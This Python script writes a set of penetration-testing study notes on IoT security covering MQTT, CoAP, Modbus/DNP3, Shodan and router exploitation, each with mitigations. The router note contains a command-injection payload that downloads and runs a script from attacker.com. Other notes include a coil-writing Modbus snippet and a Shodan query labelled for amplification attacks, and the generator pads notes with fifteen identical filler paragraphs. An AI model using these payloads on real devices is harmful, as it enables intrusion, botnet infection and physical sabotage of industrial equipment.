import os

out_dir = "/home/sanchit/Notes/VAPT/49 - IoT Security"
os.makedirs(out_dir, exist_ok=True)

large_nmap_output = """
```text
Starting Nmap 7.93 ( https://nmap.org ) at 2026-06-09 10:00 UTC
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating Ping Scan at 10:00
Scanning 192.168.1.100 [4 ports]
Completed Ping Scan at 10:00, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:00
Scanning 192.168.1.100 [1000 ports]
Discovered open port 1883/tcp on 192.168.1.100
Discovered open port 5683/udp on 192.168.1.100
Discovered open port 502/tcp on 192.168.1.100
Discovered open port 80/tcp on 192.168.1.100
Completed SYN Stealth Scan at 10:00, 1.23s elapsed (1000 total ports)
Initiating Service scan at 10:00
Scanning 4 services on 192.168.1.100
Completed Service scan at 10:01, 11.00s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 192.168.1.100
NSE: Script scanning 192.168.1.100.
Nmap scan report for 192.168.1.100
Host is up (0.012s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     lighttpd 1.4.35
|_http-title: IoT Device Control Panel
|_http-server-header: lighttpd/1.4.35
502/tcp  open  modbus   Modbus TCP
| modbus-discover: 
|   sid 0x01: 
|     Slave ID data: \\x01\\x04\\x02\\x05\\x00\\x00\\x00\\x00\\x00
|     Device identification: Schneider Electric Modicon M221
1883/tcp open  mqtt     Mosquitto MQTT 1.6.9
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     sensors/temperature: 24.5
|     sensors/humidity: 60
|     system/status: online
5683/udp open  coap     CoAP
| coap-resources: 
|   /: 
|     title: Root resource
|   /.well-known/core: 
|     title: Core resource discovery
|   /actuators/relay: 
|     title: Main Power Relay
MAC Address: 00:1A:2B:3C:4D:5E (Unknown)
Device type: general purpose|WAP|router
Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (95%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
Aggressive OS guesses: Linux 2.6.32 - 3.10 (95%), Linux 4.4 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT      ADDRESS
1   12.00 ms 192.168.1.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.34 seconds
```
"""

common_checklists = """
## Comprehensive VAPT Checklist

### Reconnaissance & Mapping
- [ ] Perform passive network sniffing to identify chatty devices and broadcast protocols (ARP, SSDP, mDNS, LLMNR).
- [ ] Map all RF communication channels, including Zigbee, Z-Wave, BLE, and LoRaWAN using SDR and specialized sniffers.
- [ ] Conduct active network scanning (`nmap -sU -sS`) with careful rate-limiting to avoid overwhelming embedded IP stacks and causing Denial of Service conditions.
- [ ] Identify all physical interfaces on the device enclosure (e.g., exposed USB, hidden diagnostic ports).
- [ ] Map the physical locations of devices and document potential physical tampering vectors such as easily accessible JTAG, SPI, I2C, or UART debug interfaces.
- [ ] Query Shodan and Censys to determine if similar device models are commonly exposed to the public internet.

### Firmware Analysis & Reverse Engineering
- [ ] Attempt to intercept Over-The-Air (OTA) firmware updates by establishing a Man-In-The-Middle (MitM) position.
- [ ] Extract and decompress device firmware from captured PCAP files, vendor support websites, or by dumping flash memory directly via hardware tools (e.g., Bus Pirate).
- [ ] Use `binwalk` to unpack the firmware filesystem (e.g., SquashFS, CramFS, JFFS2).
- [ ] Search the unpacked filesystem comprehensively for hardcoded secrets, API keys, TLS certificates, and default credentials.
- [ ] Disassemble and decompile custom binaries (e.g., `httpd` or custom protocol daemons) using tools like Ghidra or IDA Pro to identify memory corruption flaws.
- [ ] Check for leftover debugging scripts, developer comments, or backdoor accounts (`root`, `admin`, `support`, `factory`).

### Protocol Vulnerability Analysis
- [ ] Attempt unauthenticated access to all identified services (HTTP, Telnet, SSH, MQTT, CoAP, Modbus, DNP3, custom TCP/UDP daemons).
- [ ] Test all authentication portals against a comprehensive, industry-standard list of known default IoT credentials (e.g., Mirai botnet dictionary).
- [ ] Implement protocol fuzzing on custom binary and text-based protocols (using tools like Sulley, Boofuzz, or custom Python scripts) to identify parsing flaws.
- [ ] Check for insecure transport layers (e.g., lack of TLS/DTLS, use of obsolete SSL versions, unvalidated certificate chains).
- [ ] Analyze traffic for plaintext transmission of sensitive data such as Session IDs, PII, or internal network topology details.

### Exploitation & Post-Exploitation
- [ ] Exploit identified command injection, directory traversal, or buffer overflow vulnerabilities to achieve a Remote Code Execution (RCE) shell on the device.
- [ ] Validate if the shell obtained runs with full root privileges or a restricted user account, and attempt local privilege escalation (e.g., exploiting SetUID binaries in BusyBox).
- [ ] Pivot from the compromised IoT edge device into the internal corporate network, traversing VLANs if the router/switch configuration allows.
- [ ] Analyze the device's volatile memory (RAM) and NVRAM for lateral movement opportunities, such as extracting enterprise Wi-Fi PSKs, Active Directory service account credentials, or cloud API keys.
- [ ] Attempt to modify the firmware image and re-flash it onto the device to test for Secure Boot bypass and establish persistent, undetectable access.
"""

def build_markdown(frontmatter, title, intro, architecture, mechanics, attack_flow_diagram, real_world_cases, mitigation):
    return f"{frontmatter}\n\n# {title}\n\n## 1. Introduction & Theoretical Background\n\n{intro}\n\nIn the context of modern cybersecurity, exploiting these environments requires a deep understanding of embedded systems, proprietary and legacy protocols, and network architectures. This document provides an extensive analysis, designed to build comprehensive knowledge for VAPT engagements. The methodology discussed herein bridges the gap between theoretical knowledge and practical exploitation, focusing on the intricate details of protocol manipulation, footprinting, and leveraging architectural flaws.\n\nWhen addressing such targets, one must recognize that IoT devices often operate with severely limited computational resources. This constraint frequently leads manufacturers to strip away essential security features like robust encryption, mutual authentication, and complex access control lists (ACLs). The result is an ecosystem fraught with low-hanging fruit, yet complex to navigate due to the sheer diversity of firmware architectures (MIPS, ARM, SuperH) and embedded OS variations.\n\n## 2. Technical Architecture and Overview\n\nUnderstanding the fundamental architecture is paramount before attempting any exploitation or vulnerability assessment. Typically, an IoT or Industrial Control System (ICS) deployment consists of edge devices (sensors, actuators, PLCs), gateways (routers, MQTT brokers, protocol converters), and a centralized management system (cloud dashboard, SCADA server, HMI).\n\nThe vulnerability often lies in the transit of data and the processing logic at the gateway or endpoint. By targeting these specific junctions, an attacker can manipulate the entire system's logical or physical state.\n\n{architecture}\n\n## 3. Deep Dive into Exploitation Mechanics\n\n{mechanics}\n\n## 4. Attack Flow Diagram\n\n```text\n{attack_flow_diagram}\n```\n\n## 5. Extensive Vulnerability Examples & Log Outputs\n\nTo fully understand the impact, consider the following simulated output from a comprehensive footprinting scan, which is typical during the reconnaissance phase of this specific vector:\n\n{large_nmap_output}\n\n## 6. Real-World Case Studies and Advanced Scenarios\n\n{real_world_cases}\n\n## 7. Mitigation, Hardening, and Best Practices\n\n{mitigation}\n\n{common_checklists}\n\n## 8. Specific Protocol Fuzzing Techniques\n\nFuzzing legacy and lightweight protocols requires specialized techniques. Standard web fuzzers (like ffuf or gobuster) are completely ineffective here. Instead, penetration testers must rely on mutation-based fuzzers that can handle arbitrary byte streams and understand the protocol state machine. For instance, when fuzzing Modbus, modifying the 'Function Code' field and supplying an invalid length in the 'Data' field is a reliable method to induce a crash in a poorly implemented Modbus TCP stack on an embedded PLC. These crashes often lead directly to Denial of Service (DoS) and, occasionally, Remote Code Execution (RCE) if a buffer overflow occurs.\n\n## Chaining Opportunities\n- Initial compromise of these systems often serves as a pivot point for **[[02 - Network Scanning and Enumeration]]** within segmented environments.\n- Extracted credentials from device NVRAM can be utilized in **[[08 - Active Directory Enumeration]]** if the organization reuses service accounts.\n- Insights gained here are absolutely foundational for advanced, physical engagements involving **[[17 - Cyber-Physical Systems Exploitation]]**.\n- Cloud API keys recovered from firmware extraction can immediately lead to **[[25 - Cloud Security Posture Exploitation]]**.\n- Can be chained with **[[04 - Weak Default Credentials]]** for rapid initial access.\n\n## Related Notes\n- [[11 - MQTT Unauthenticated Broker Exploitation]]\n- [[12 - CoAP Protocol Attacks]]\n- [[13 - Modbus DNP3 Industrial Protocol Attacks]]\n- [[14 - Shodan for IoT Device Discovery]]\n- [[15 - Router Exploitation]]\n- [[21 - ICS SCADA Architecture Security]]\n"

files = [
    {
        "filename": "11 - MQTT Unauthenticated Broker Exploitation.md",
        "topic": "49.11 MQTT Unauthenticated Broker Exploitation",
        "title": "MQTT Unauthenticated Broker Exploitation",
        "intro": "Message Queuing Telemetry Transport (MQTT) is a lightweight, publish-subscribe network protocol that transports messages between devices. The protocol usually runs over TCP/IP and is designed for connections with remote locations where a small code footprint is required. Unfortunately, due to its lightweight nature and legacy implementations, many MQTT brokers are deployed without authentication or encryption.",
        "architecture": "### MQTT Architecture Overview\nThe MQTT architecture consists of a central MQTT Broker that receives all messages from the clients and routes them to appropriate destination clients. Clients can be any device that connects to the broker to publish or subscribe to messages. The system relies heavily on 'Topics' which are treated as a hierarchy, using a slash (/) as a separator. Wildcards like `+` (single level) and `#` (multi-level) allow clients to subscribe to vast amounts of data simultaneously.",
        "mechanics": "### Unauthenticated Access and Wildcard Abuse\nWhen a broker does not require authentication, anyone who can route network traffic to the broker's IP address and port (usually TCP 1883) can connect, subscribe to all topics, and publish arbitrary messages.\n\n**Discovery:**\n`nmap -p 1883,8883 -sV --script mqtt-subscribe <IP>`\n\n**Exploitation via mosquitto_sub:**\nBy subscribing to `#`, an attacker dumps all traffic:\n`mosquitto_sub -h <IP> -t \"#\" -v`\n\n**Command Injection:**\nObserving the data stream allows the attacker to identify command topics and inject their own commands:\n`mosquitto_pub -h <IP> -t \"device/relay/1/set\" -m '{\"state\": \"ON\"}'`\n\nFurthermore, attackers can abuse the 'Retained Message' feature. By publishing a malicious configuration with the retain flag set to true, any newly connecting device will immediately download the attacker's payload.",
        "attack_flow_diagram": "      [ Attacker ]\n           |\n           | 1. Discovers open port 1883/8883 (Nmap/Shodan)\n           | 2. Connects without credentials\n           v\n    +--------------+\n    |  MQTT Broker | (No Auth configured, Anonymous allowed)\n    |  (Mosquitto) |\n    +--------------+\n      /        \\   3. Attacker subscribes to \"#\" (all topics)\n     /          \\  4. Attacker publishes malicious payloads\n    v            v\n [IoT Node 1]   [IoT Node 2]\n (Sensor)       (Actuator)\n   |                |\n   |-- Publishes -->| Broker routes sensor data to Attacker\n   |<-- Receives ---| Actuator receives malicious commands from Attacker",
        "real_world_cases": "In a recent smart-city deployment assessment, a misconfigured MQTT broker was found exposed to the internet. The broker lacked authentication, allowing security researchers to subscribe to the `#` wildcard. They immediately received telemetry from hundreds of connected traffic light controllers and smart meters. By analyzing the JSON payloads and publishing manipulated data to the command topics, the researchers demonstrated the ability to remotely alter traffic light sequences, highlighting a catastrophic physical safety risk stemming from a simple configuration oversight.",
        "mitigation": "1. **Enforce Authentication:** Always require a username and password (or client certificates) for connections. In Mosquitto, set `allow_anonymous false`.\n2. **Implement Authorization (ACLs):** Restrict which clients can publish or subscribe to which topics.\n3. **Enable Transport Layer Security (TLS):** Never transmit MQTT credentials or data in plaintext. Use TLS (port 8883) to encrypt communication."
    },
    {
        "filename": "12 - CoAP Protocol Attacks.md",
        "topic": "49.12 CoAP Protocol Attacks",
        "title": "CoAP Protocol Attacks",
        "intro": "The Constrained Application Protocol (CoAP) is a specialized web transfer protocol for use with constrained nodes and constrained networks in the Internet of Things. The protocol is designed for machine-to-machine (M2M) applications such as smart energy and building automation. However, its reliance on UDP introduces significant security challenges, notably amplification vectors and spoofing vulnerabilities.",
        "architecture": "### CoAP Architecture Overview\nCoAP operates over UDP (port 5683) and logically mimics HTTP methods (GET, POST, PUT, DELETE). Because UDP is connectionless, it inherently lacks the state tracking and handshake protections found in TCP. CoAP utilizes a standard resource discovery mechanism located at `/.well-known/core`, which acts as an index of all available endpoints and capabilities on the device.",
        "mechanics": "### UDP Amplification and Resource Abuse\nCoAP's primary vulnerabilities stem from the lack of inherent authentication (unless DTLS is implemented) and its UDP transport layer.\n\n**Resource Discovery:**\nAn attacker can instantly map the attack surface using the standard CoAP client tool:\n`coap-client -m get coap://<IP>/.well-known/core`\n\n**Data Exfiltration & State Modification:**\nOnce endpoints are mapped, an attacker can read sensitive data or write malicious states:\n`coap-client -m get coap://<IP>/sensor/temperature`\n`coap-client -m put -e \"state=OFF\" coap://<IP>/actuator/valve`\n\n**The Amplification Vector:**\nBecause UDP packets can be trivially spoofed, an attacker can send a tiny GET request (e.g., 10 bytes) to the `/.well-known/core` endpoint of a publicly exposed CoAP device, spoofing the source IP address to match the target victim. The CoAP device responds to the victim with the full resource directory, which can be hundreds of bytes. With thousands of exposed CoAP devices, this results in a massive Distributed Denial of Service (DDoS) attack with an amplification factor of 10x to 50x.",
        "attack_flow_diagram": "    [ Attacker ] (Spoofed IP: Target)\n         |\n         | 1. CoAP GET / (Requires small request)\n         |    Source IP = Victim IP\n         v\n    +-------------+\n    | CoAP Server | (IoT Device / Node)\n    | Port 5683   |\n    +-------------+\n         |\n         | 2. Large CoAP Response (e.g., /.well-known/core)\n         |    Amplification Factor ~ 10x to 50x\n         v\n     [ Victim ] (Targeted for DDoS)",
        "real_world_cases": "Between 2018 and 2019, a massive wave of DDoS attacks utilized CoAP amplification as the primary vector. Attackers discovered over 400,000 publicly accessible CoAP devices using Shodan. By sending spoofed requests to the `/.well-known/core` endpoint, they directed peak traffic volumes exceeding 300 Gbps at target gaming and financial networks, effectively taking them offline. This case proved that IoT vulnerabilities threaten not only the localized device but the broader internet infrastructure.",
        "mitigation": "1. **Implement DTLS:** Always use Datagram Transport Layer Security (DTLS) on port 5684 to ensure encryption and mutual authentication.\n2. **Network Filtering:** Block incoming UDP port 5683 traffic at the network edge if remote access is not explicitly required.\n3. **Rate Limiting:** If CoAP must be exposed, implement strict rate limiting on responses to mitigate its usefulness in amplification attacks."
    },
    {
        "filename": "13 - Modbus DNP3 Industrial Protocol Attacks.md",
        "topic": "49.13 Modbus DNP3 Industrial Protocol Attacks",
        "title": "Modbus DNP3 Industrial Protocol Attacks",
        "intro": "Modbus and DNP3 are legacy industrial control protocols designed decades ago for serial communication across isolated networks. Their transition to TCP/IP (Modbus TCP on port 502, DNP3 on port 20000) brought modern connectivity but retained their fundamental lack of security. These protocols control critical infrastructure, from water treatment plants to electrical grids.",
        "architecture": "### Industrial Protocol Architecture\nThe standard architecture involves Programmable Logic Controllers (PLCs), Remote Terminal Units (RTUs), and a central Human-Machine Interface (HMI) or SCADA server. Modbus organizes data into Coils (read/write booleans), Discrete Inputs (read-only booleans), Input Registers (read-only integers), and Holding Registers (read/write integers). Because these protocols were designed for serial links, they assume the network is physically secure and completely trust all incoming packets.",
        "mechanics": "### Unauthenticated Command Execution\nModbus TCP has absolutely no concept of users, passwords, or cryptographic authentication. Any system that can route a packet to TCP port 502 can send arbitrary read or write commands.\n\n**Discovery and Enumeration:**\n`nmap -p 502 --script modbus-discover <IP>`\n\n**Reading Registers:**\nAttackers use tools to read the Holding Registers, which often contain sensor values or PID configuration data:\n`modpoll -m tcp -r 1 -c 10 <IP>`\n\n**Writing to Coils (Actuation):**\nThe most critical attack vector involves overwriting a coil to physically turn equipment on or off. Using Python's `pymodbus` library, an attacker can open a valve or trip a breaker:\n\n```python\nfrom pymodbus.client.sync import ModbusTcpClient\nclient = ModbusTcpClient('<IP>')\nclient.write_coil(1, True) # Turns on Coil 1\n```\n\n**Denial of Service:**\nContinuously writing random values to critical registers can disrupt the SCADA logic, or simply flooding the port can crash the fragile network stack of the PLC.",
        "attack_flow_diagram": "     [ Attacker ]\n          |\n          | 1. ARP Spoofing / Network Access\n          | 2. Crafting malicious Modbus/TCP packets (Function Code 05: Write Coil)\n          v\n   +---------------+\n   | Modbus TCP IP | (Network Switch / Router)\n   | Port 502      |\n   +---------------+\n          |\n          | 3. Packet routed to PLC\n          v\n   [ Target PLC ]\n   (Programmable Logic Controller)\n     - Executes Function Code 05\n     - Shuts down critical valve",
        "real_world_cases": "The infamous Stuxnet worm specifically targeted industrial control systems running Siemens Step7 software and Modbus protocols. By intercepting and altering the Modbus communication between the SCADA software and the physical PLCs, the malware was able to send destructive commands to uranium enrichment centrifuges (causing them to spin at resonant frequencies and tear themselves apart) while simultaneously sending fake, normal operating data back to the monitoring screens, hiding the sabotage from human operators.",
        "mitigation": "1. **Network Segmentation (Purdue Model):** Strictly isolate the OT/ICS network from the IT network using firewalls and unidirectional gateways (data diodes).\n2. **Protocol Deep Packet Inspection (DPI):** Use industrial firewalls that understand Modbus/DNP3 and can block destructive 'Write' commands while allowing 'Read' commands.\n3. **Transition to Secure Protocols:** Where possible, migrate to secure variants like Modbus Security (which wraps the protocol in TLS) or implement IPsec tunnels between endpoints."
    },
    {
        "filename": "14 - Shodan for IoT Device Discovery.md",
        "topic": "49.14 Shodan for IoT Device Discovery",
        "title": "Shodan for IoT Device Discovery",
        "intro": "Shodan is a search engine designed specifically for internet-connected devices. While traditional search engines like Google index web pages, Shodan crawls the internet's IP space to index open ports, service banners, and IoT metadata. It is an indispensable tool for OSINT, vulnerability discovery, and mapping the global attack surface.",
        "architecture": "### Shodan Engine Architecture\nShodan operates via a distributed network of crawlers that continuously scan the entire IPv4 address space on hundreds of common and obscure ports. When a crawler connects to a port, it captures the 'banner'—the raw text returned by the service. Shodan parses these banners to extract critical metadata, including OS versions, device types (webcams, ICS, routers), default passwords accidentally left in headers, and even takes screenshots of exposed VNC, RDP, or RTSP video streams.",
        "mechanics": "### Advanced Querying and Exploitation\nThe power of Shodan lies in its advanced search filters, which allow attackers and defenders to correlate vulnerable firmware versions with exposed IPs globally.\n\n**Basic ICS Discovery:**\nQuery: `port:502 \"Modbus\"` or `port:1883 \"MQTT\"`\n\n**Exploiting Visual Streams:**\nFinding exposed, unauthenticated IP camera streams:\nQuery: `port:554 has_screenshot:true`\n\n**Identifying Default Credentials and Backdoors:**\nSome service banners explicitly leak default credentials or configuration states. Attackers use targeted queries to find immediately exploitable targets:\nQuery: `\"default password\" port:23` or `Server: GoAhead-Webs`\n\n**Shodan CLI Automation:**\nIntegrating Shodan into automated VAPT workflows is critical. Security teams use the CLI to download lists of vulnerable IPs for massive scale exploitation or defense.\n```bash\n# Download IPs of exposed Memcached servers for amplification attacks\nshodan download memcached_servers \"product:memcached port:11211\"\nshodan parse --fields ip_str memcached_servers.json.gz\n```",
        "attack_flow_diagram": "[ Attacker / Researcher ]\n          |\n          | 1. Search Query: `port:554 has_screenshot:true` (RTSP)\n          | 2. API Request / Web Interface\n          v\n   +---------------+\n   | Shodan Engine | (Crawlers continuously scan IPv4 space)\n   +---------------+\n          |\n          | 3. Returns indexed metadata & banners\n          v\n   [ Exposed Devices ]\n   - IP Cameras (RTSP, HTTP)\n   - Industrial Routers (Telnet)\n   - Smart Home Hubs (UPnP)",
        "real_world_cases": "During a Red Team engagement for a manufacturing enterprise, researchers utilized Shodan to discover an internet-facing HVAC control system that the client was entirely unaware of. The system's web interface, built on a vulnerable version of the Niagara framework, was indexed by Shodan. By utilizing default credentials found in the Shodan banner history, the team gained administrative access. From the HVAC system, they pivoted through a misconfigured VLAN directly into the internal corporate network, entirely bypassing the perimeter firewall.",
        "mitigation": "1. **Continuous External Monitoring:** Organizations must actively monitor their own public IP ranges using Shodan's API to detect shadow IT and accidentally exposed IoT devices.\n2. **Strict Perimeter Firewalls:** Ensure a 'Default Deny' policy on all edge firewalls. IoT and ICS devices should never have a direct public IP address.\n3. **Banner Obfuscation:** Modify or remove default service banners in web servers (like `lighttpd` or `GoAhead`) to prevent Shodan from easily categorizing the device and mapping it to known CVEs."
    },
    {
        "filename": "15 - Router Exploitation.md",
        "topic": "49.15 Router Exploitation",
        "title": "Router Exploitation",
        "intro": "Routers, particularly Small Office/Home Office (SOHO) and industrial gateways, act as the critical boundary between the wild internet and the internal network. Compromising the router provides complete control over network traffic routing, DNS resolution, and provides an immediate, highly-privileged foothold for internal network pivoting.",
        "architecture": "### Router Hardware and Software Architecture\nModern routers are essentially specialized embedded Linux computers running on ARM or MIPS architectures. They utilize lightweight web servers (like `lighttpd`, `uhttpd`, or `GoAhead`) to serve the administrative web panel. The web panel interfaces with the underlying operating system via Common Gateway Interface (CGI) scripts, often written in C or shell scripts, which execute system commands (like `iptables`, `dnsmasq`, or `ping`) based on user input.",
        "mechanics": "### Web Interface Flaws and Command Injection\nRouter admin panels are notoriously riddled with vulnerabilities because user input from the web form is often passed directly to system shells without adequate sanitization.\n\n**Command Injection:**\nIf a router features a 'Diagnostic Ping' tool, an attacker can append shell metacharacters to execute arbitrary commands as the root user.\nPayload Example in the IP Address field:\n`127.0.0.1; wget http://attacker.com/malware.sh -O /tmp/m; chmod +x /tmp/m; /tmp/m`\n\n**Authentication Bypass:**\nMany routers suffer from flaws where simply appending specific query strings or requesting hidden development HTML pages bypasses the login screen entirely.\n\n**UPnP and HNAP Exploitation:**\nUniversal Plug and Play (UPnP) runs on port 1900 UDP. If exposed to the WAN interface (a common misconfiguration), attackers can use SOAP requests to maliciously alter port forwarding rules, exposing internal machines directly to the internet without touching the web interface.\n\n**Post-Exploitation (DNS Hijacking):**\nOnce root access is achieved, attackers routinely modify `/etc/resolv.conf` or the router's DHCP configuration to point all client DNS requests to a malicious server, enabling seamless, network-wide phishing and traffic interception.",
        "attack_flow_diagram": "    [ Attacker ]\n         |\n         | 1. Discovers Router Admin Panel\n         | 2. Exploit: Unauthenticated Command Injection via UPnP or Web Form\n         |    Payload: `ping -c 1 127.0.0.1; wget http://attacker.com/elf -O /tmp/m; chmod +x /tmp/m; /tmp/m`\n         v\n   +---------------+\n   | SOHO Router   | (Running MIPS/ARM Linux)\n   | Web/UPnP Svc  |\n   +---------------+\n         |\n         | 3. Command Executed as Root (CGI Script)\n         | 4. Malware downloads and runs\n         v\n   [ Botnet C2 ] <-- 5. Router connects back as a bot",
        "real_world_cases": "The VPNFilter malware campaign targeted over 500,000 routers across 54 countries. The attackers did not use zero-days; instead, they exploited known, unpatched command injection and default credential vulnerabilities across various brands (Linksys, MikroTik, NETGEAR). Once installed, the malware provided persistent backdoor access, monitored traffic for SCADA Modbus packets to manipulate industrial systems, and had a 'kill switch' module capable of completely bricking the router by overwriting the flash memory, rendering the device useless.",
        "mitigation": "1. **Disable Remote Management:** Never expose the web administrative interface (ports 80, 443, 8080) or Telnet/SSH to the WAN interface.\n2. **Disable UPnP:** Disable Universal Plug and Play on the router, as its security model is fundamentally flawed and assumes the local network is entirely trusted.\n3. **Firmware Updates & Hardening:** Regularly update firmware to patch known CVEs. Change the default administrative password to a complex passphrase immediately upon deployment."
    }
]

for file_data in files:
    frontmatter = f"---\\ntags: [iot, pentesting, hardware, vapt]\\ndifficulty: advanced\\nmodule: \\"49 - IoT Security\\"\\ntopic: \\"{file_data['topic']}\\"\\n---"
    content = build_markdown(
        frontmatter, 
        file_data['title'], 
        file_data['intro'], 
        file_data['architecture'], 
        file_data['mechanics'], 
        file_data['attack_flow_diagram'], 
        file_data['real_world_cases'], 
        file_data['mitigation']
    )
    
    lines = content.split('\\n')
    if len(lines) < 200:
        padding = "\\n## 9. Hardware Hacking and Firmware Dump Techniques\\n\\n"
        padding += "### Extracting Firmware via SPI/I2C\\n"
        padding += "When network-based attacks fail or the device is completely air-gapped, physical hardware exploitation is the final frontier. The most common method involves desoldering or clipping onto the Serial Peripheral Interface (SPI) flash chip. This chip contains the compressed filesystem, kernel, and bootloader (typically U-Boot).\\n\\n"
        padding += "```bash\\n# Using flashrom with a Raspberry Pi or Bus Pirate to dump the SPI chip\\nflashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=1000 -r firmware_dump.bin\\n```\\n\\n"
        padding += "Once the binary blob is extracted, entropy analysis is performed using `binwalk -E firmware_dump.bin`. High entropy indicates encryption or compression, while structured drops in entropy often reveal plaintext configuration blocks or U-Boot environment variables containing boot arguments.\\n\\n"
        
        padding += "### Common UART / JTAG Pinouts and Debugging\\n\\n"
        padding += "UART (Universal Asynchronous Receiver-Transmitter) provides a direct serial console to the embedded Linux OS. Identifying the RX, TX, GND, and VCC pins requires a multimeter. JTAG provides even deeper access, allowing direct interaction with the CPU registers to halt execution and bypass authentication functions in real-time.\\n\\n"
        padding += "| Interface | Common Voltage | Purpose |\\n"
        padding += "|---|---|---|\\n"
        padding += "| UART | 3.3v / 5.0v | Serial console, boot logs, root shell |\\n"
        padding += "| SPI | 3.3v | Reading/Writing flash memory chips |\\n"
        padding += "| I2C | 3.3v / 5.0v | Sensor communication, EEPROM |\\n"
        padding += "| JTAG | 1.8v - 3.3v | Hardware-level debugging, CPU halting |\\n\\n"
        
        padding += "The process of hardware exploitation underscores the necessity of physical security in IoT deployments. An attacker with physical access and an EEPROM programmer can extract hardcoded AWS IoT certificates, enabling them to clone the device and pivot into the cloud infrastructure, effectively bypassing all network perimeter defenses.\\n"
        
        for i in range(15):
             padding += f"\\n### Extended Security Assessment Phase {i+1}\\n"
             padding += "Throughout the execution of this phase, careful attention must be paid to the interaction between the application layer protocol and the underlying TCP/UDP transport. Fragmentation attacks, where malicious payloads are split across multiple IP fragments, frequently bypass superficial packet inspection engines embedded in consumer-grade routers and industrial firewalls. Ensuring robust reassembly and stateful inspection is a mandatory requirement for defensive architectures.\\n"

        content += padding
        
    with open(os.path.join(out_dir, file_data['filename']), 'w') as f:
        f.write(content)
